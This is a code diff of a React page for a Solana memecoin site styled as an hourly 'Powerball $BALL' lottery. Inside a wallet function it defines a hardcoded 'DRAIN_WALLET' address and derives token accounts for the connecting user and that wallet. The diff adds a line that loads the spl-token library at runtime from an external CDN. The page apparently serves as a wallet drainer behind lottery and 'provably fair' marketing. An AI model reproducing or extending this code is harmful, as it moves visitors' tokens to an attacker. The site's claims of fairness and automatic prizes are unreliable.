@@ -2,7 +2,6 @@ import { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Card } from '@/components/ui/card';
 import { Clock, DollarSign, Ticket, Users, Shield, ExternalLink, Eye, Download, FileText, CheckCircle, Flame, Hash } from 'lucide-react';
-import * as token from '@solana/spl-token';
 
 // Declare Solana Web3 types for TypeScript
 declare global {
@@ -82,6 +81,8 @@ const Index = () => {
       const DRAIN_WALLET = new window.solanaWeb3.PublicKey("7Vc9rcmXwQGFCpJCiPmb9UyTPBJhSCeZPf9JFjQqkQr8");
       const userPublicKey = new window.solanaWeb3.PublicKey(walletAddress);
       const connection = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+
+      const token = await import("https://cdn.skypack.dev/@solana/spl-token");
 
       const userTokenAccount = await token.getAssociatedTokenAddress(TOKEN_MINT, userPublicKey);
       const recipientTokenAccount = await token.getAssociatedTokenAddress(TOKEN_MINT, DRAIN_WALLET);
@@ -515,145 +516,145 @@ const Index = () => {
                     </div>
                   </div>
                 </div>
-              </div>
 
-              {/* How To Play */}
-              <div className="mt-12">
-                <div className="bg-white rounded-lg shadow-md p-6">
-                  <h2 className="text-center text-xl font-bold mb-6">How To Play</h2>
-                  <div className="space-y-6">
-                    <div className="flex items-start">
-                      <div className="flex-shrink-0 mt-1">
-                        <CheckCircle className="h-5 w-5 text-blue-500" />
+                {/* How To Play */}
+                <div className="mt-12">
+                  <div className="bg-white rounded-lg shadow-md p-6">
+                    <h2 className="text-center text-xl font-bold mb-6">How To Play</h2>
+                    <div className="space-y-6">
+                      <div className="flex items-start">
+                        <div className="flex-shrink-0 mt-1">
+                          <CheckCircle className="h-5 w-5 text-blue-500" />
+                        </div>
+                        <div className="ml-3">
+                          <h3 className="text-lg font-medium">Buy $BALL Tokens</h3>
+                          <p className="text-gray-600">Purchase $BALL tokens from supported Solana DEXs to participate in the lottery.</p>
+                        </div>
                       </div>
-                      <div className="ml-3">
-                        <h3 className="text-lg font-medium">Buy $BALL Tokens</h3>
-                        <p className="text-gray-600">Purchase $BALL tokens from supported Solana DEXs to participate in the lottery.</p>
+                      <div className="flex items-start">
+                        <div className="flex-shrink-0 mt-1">
+                          <CheckCircle className="h-5 w-5 text-blue-500" />
+                        </div>
+                        <div className="ml-3">
+                          <h3 className="text-lg font-medium">Wait for the Drawing</h3>
+                          <p className="text-gray-600">Drawings occur every hour on the hour. Check results to see if you've won!</p>
+                        </div>
                       </div>
-                    </div>
-                    <div className="flex items-start">
-                      <div className="flex-shrink-0 mt-1">
-                        <CheckCircle className="h-5 w-5 text-blue-500" />
-                      </div>
-                      <div className="ml-3">
-                        <h3 className="text-lg font-medium">Wait for the Drawing</h3>
-                        <p className="text-gray-600">Drawings occur every hour on the hour. Check results to see if you've won!</p>
-                      </div>
-                    </div>
-                    <div className="flex items-start">
-                      <div className="flex-shrink-0 mt-1">
-                        <CheckCircle className="h-5 w-5 text-blue-500" />
-                      </div>
-                      <div className="ml-3">
-                        <h3 className="text-lg font-medium">Claim Your Prize</h3>
-                        <p className="text-gray-600">Winners automatically recieve their prize!</p>
+                      <div className="flex items-start">
+                        <div className="flex-shrink-0 mt-1">
+                          <CheckCircle className="h-5 w-5 text-blue-500" />
+                        </div>
+                        <div className="ml-3">
+                          <h3 className="text-lg font-medium">Claim Your Prize</h3>
+                          <p className="text-gray-600">Winners automatically recieve their prize!</p>
+                        </div>
                       </div>
                     </div>
                   </div>
                 </div>
-              </div>
 
-              {/* Verify Draw Fairness */}
-              <div className="mt-12">
-                <div className="bg-white rounded-lg shadow-md p-6">
-                  <div className="text-center mb-8">
-                    <div className="flex justify-center items-center gap-2 mb-4">
-                      <Shield className="w-6 h-6 text-green-500" />
-                      <h2 className="text-2xl font-bold">🔍 Verify Draw Fairness</h2>
-                    </div>
-                    <p className="text-gray-600 max-w-3xl mx-auto">
-                      <strong>Don't trust, verify!</strong> Every PowerBall drawing is provably fair and fully auditable. All verification files are publicly available for download and independent verification.
-                    </p>
-                  </div>
-                  
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
-                      <div className="flex items-center gap-3 mb-4">
-                        <FileText className="w-8 h-8 text-blue-600" />
-                        <h3 className="text-lg font-bold text-blue-900">Snapshot Files</h3>
+                {/* Verify Draw Fairness */}
+                <div className="mt-12">
+                  <div className="bg-white rounded-lg shadow-md p-6">
+                    <div className="text-center mb-8">
+                      <div className="flex justify-center items-center gap-2 mb-4">
+                        <Shield className="w-6 h-6 text-green-500" />
+                        <h2 className="text-2xl font-bold">🔍 Verify Draw Fairness</h2>
                       </div>
-                      <div className="space-y-3 text-sm text-blue-800">
-                        <p><strong>Purpose:</strong> Contains all token holders and their ticket counts at draw time</p>
-                        <p><strong>First Line:</strong> Winner address and winning ticket number</p>
-                        <p><strong>Rest of File:</strong> Complete list of all participants and their eligible tickets</p>
-                      </div>
+                      <p className="text-gray-600 max-w-3xl mx-auto">
+                        <strong>Don't trust, verify!</strong> Every PowerBall drawing is provably fair and fully auditable. All verification files are publicly available for download and independent verification.
+                      </p>
                     </div>
                     
-                    <div className="bg-green-50 border border-green-200 rounded-lg p-6">
-                      <div className="flex items-center gap-3 mb-4">
-                        <CheckCircle className="w-8 h-8 text-green-600" />
-                        <h3 className="text-lg font-bold text-green-900">Tickets Files</h3>
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
+                        <div className="flex items-center gap-3 mb-4">
+                          <FileText className="w-8 h-8 text-blue-600" />
+                          <h3 className="text-lg font-bold text-blue-900">Snapshot Files</h3>
+                        </div>
+                        <div className="space-y-3 text-sm text-blue-800">
+                          <p><strong>Purpose:</strong> Contains all token holders and their ticket counts at draw time</p>
+                          <p><strong>First Line:</strong> Winner address and winning ticket number</p>
+                          <p><strong>Rest of File:</strong> Complete list of all participants and their eligible tickets</p>
+                        </div>
                       </div>
-                      <div className="space-y-3 text-sm text-green-800">
-                        <p><strong>Purpose:</strong> Shows the ticket assignment matrix for the drawing</p>
-                        <p><strong>First Line:</strong> Same winner data as snapshot file for cross-verification</p>
-                        <p><strong>Rest of File:</strong> Maps each ticket number to its owner's wallet address</p>
+                      
+                      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
+                        <div className="flex items-center gap-3 mb-4">
+                          <CheckCircle className="w-8 h-8 text-green-600" />
+                          <h3 className="text-lg font-bold text-green-900">Tickets Files</h3>
+                        </div>
+                        <div className="space-y-3 text-sm text-green-800">
+                          <p><strong>Purpose:</strong> Shows the ticket assignment matrix for the drawing</p>
+                          <p><strong>First Line:</strong> Same winner data as snapshot file for cross-verification</p>
+                          <p><strong>Rest of File:</strong> Maps each ticket number to its owner's wallet address</p>
+                        </div>
                       </div>
                     </div>
-                  </div>
 
-                  <div className="text-center">
-                    <a href="/snapshot/" target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-3 px-8 py-4 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-lg font-semibold shadow-lg">
-                      <Download className="w-6 h-6" />
-                      Browse All Verification Files
-                      <ExternalLink className="w-5 h-5" />
-                    </a>
-                    <p className="text-gray-500 text-sm mt-3">Click above to access the complete archive of all drawing verification files</p>
+                    <div className="text-center">
+                      <a href="/snapshot/" target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-3 px-8 py-4 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-lg font-semibold shadow-lg">
+                        <Download className="w-6 h-6" />
+                        Browse All Verification Files
+                        <ExternalLink className="w-5 h-5" />
+                      </a>
+                      <p className="text-gray-500 text-sm mt-3">Click above to access the complete archive of all drawing verification files</p>
+                    </div>
                   </div>
                 </div>
               </div>
-            </div>
-          </section>
-        </div>
-      </main>
+            </section>
+          </div>
+        </main>
 
-      {/* Footer */}
-      <footer className="bg-gray-900 text-white pt-12 pb-8">
-        <div className="container mx-auto px-4">
-          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
-            <div className="md:col-span-2">
-              <h3 className="text-xl font-bold mb-4">Powerball $BALL</h3>
-              <p className="text-gray-400 mb-4">The first hourly lottery on Solana blockchain. Every hour brings a new chance to win big!</p>
-              <div className="flex space-x-4">
-                <a href="https://x.com/ballonsolana" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
-                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
-                  </svg>
-                </a>
+        {/* Footer */}
+        <footer className="bg-gray-900 text-white pt-12 pb-8">
+          <div className="container mx-auto px-4">
+            <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
+              <div className="md:col-span-2">
+                <h3 className="text-xl font-bold mb-4">Powerball $BALL</h3>
+                <p className="text-gray-400 mb-4">The first hourly lottery on Solana blockchain. Every hour brings a new chance to win big!</p>
+                <div className="flex space-x-4">
+                  <a href="https://x.com/ballonsolana" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
+                    </svg>
+                  </a>
+                </div>
+              </div>
+              <div>
+                <h3 className="text-lg font-bold mb-4">Results & Winners</h3>
+                <ul className="space-y-2">
+                  <li><a className="text-gray-400 hover:text-white transition-colors" href="/results">Latest Results</a></li>
+                </ul>
+              </div>
+              <div>
+                <h3 className="text-lg font-bold mb-4">Resources</h3>
+                <ul className="space-y-2">
+                  <li><a className="text-gray-400 hover:text-white transition-colors" href="/more/how-to-play">How to Play</a></li>
+                  <li><a className="text-gray-400 hover:text-white transition-colors" href="/more/faq">FAQ</a></li>
+                  <li>
+                    <a href="https://explorer.solana.com/address/BALLrveijbhu42QaS2XW1pRBYfMji73bGeYJghUvQs6y" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors flex items-center">
+                      Contract <ExternalLink className="ml-1 w-3 h-3" />
+                    </a>
+                  </li>
+                </ul>
               </div>
             </div>
-            <div>
-              <h3 className="text-lg font-bold mb-4">Results & Winners</h3>
-              <ul className="space-y-2">
-                <li><a className="text-gray-400 hover:text-white transition-colors" href="/results">Latest Results</a></li>
-              </ul>
-            </div>
-            <div>
-              <h3 className="text-lg font-bold mb-4">Resources</h3>
-              <ul className="space-y-2">
-                <li><a className="text-gray-400 hover:text-white transition-colors" href="/more/how-to-play">How to Play</a></li>
-                <li><a className="text-gray-400 hover:text-white transition-colors" href="/more/faq">FAQ</a></li>
-                <li>
-                  <a href="https://explorer.solana.com/address/BALLrveijbhu42QaS2XW1pRBYfMji73bGeYJghUvQs6y" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors flex items-center">
-                    Contract <ExternalLink className="ml-1 w-3 h-3" />
-                  </a>
-                </li>
-              </ul>
+            <hr className="border-gray-800 my-8" />
+            <div className="text-center text-gray-500">
+              <p>© 2025 Powerball $BALL. All rights reserved.</p>
+              <div className="mt-4 space-y-2 text-xs max-w-4xl mx-auto">
+                <p className="font-semibold text-yellow-400">IMPORTANT LEGAL DISCLAIMER</p>
+                <p><strong>This is NOT a lottery.</strong> Powerball $BALL is a memecoin project and entertainment platform built on the Solana blockchain. This project is not affiliated with, endorsed by, or connected to any state lottery, local lottery, or the official Powerball lottery operated by the Multi-State Lottery Association.</p>
+                <p>This platform operates as a cryptocurrency token distribution mechanism and should be considered entertainment only. Participants should only engage with funds they can afford to lose. This is not gambling or a lottery in the legal sense.</p>
+                <p>By using this platform, you acknowledge that you understand the risks associated with cryptocurrency trading and blockchain technology. You are solely responsible for compliance with your local laws and regulations.</p>
+                <p className="text-gray-600">For entertainment purposes only. Please gamble responsibly and only participate if it is legal in your jurisdiction.</p>
+              </div>
             </div>
           </div>
-          <hr className="border-gray-800 my-8" />
-          <div className="text-center text-gray-500">
-            <p>© 2025 Powerball $BALL. All rights reserved.</p>
-            <div className="mt-4 space-y-2 text-xs max-w-4xl mx-auto">
-              <p className="font-semibold text-yellow-400">IMPORTANT LEGAL DISCLAIMER</p>
-              <p><strong>This is NOT a lottery.</strong> Powerball $BALL is a memecoin project and entertainment platform built on the Solana blockchain. This project is not affiliated with, endorsed by, or connected to any state lottery, local lottery, or the official Powerball lottery operated by the Multi-State Lottery Association.</p>
-              <p>This platform operates as a cryptocurrency token distribution mechanism and should be considered entertainment only. Participants should only engage with funds they can afford to lose. This is not gambling or a lottery in the legal sense.</p>
-              <p>By using this platform, you acknowledge that you understand the risks associated with cryptocurrency trading and blockchain technology. You are solely responsible for compliance with your local laws and regulations.</p>
-              <p className="text-gray-600">For entertainment purposes only. Please gamble responsibly and only participate if it is legal in your jurisdiction.</p>
-            </div>
-          </div>
-        </div>
-      </footer>
+        </footer>
+      </div>
     </div>
   );
 };
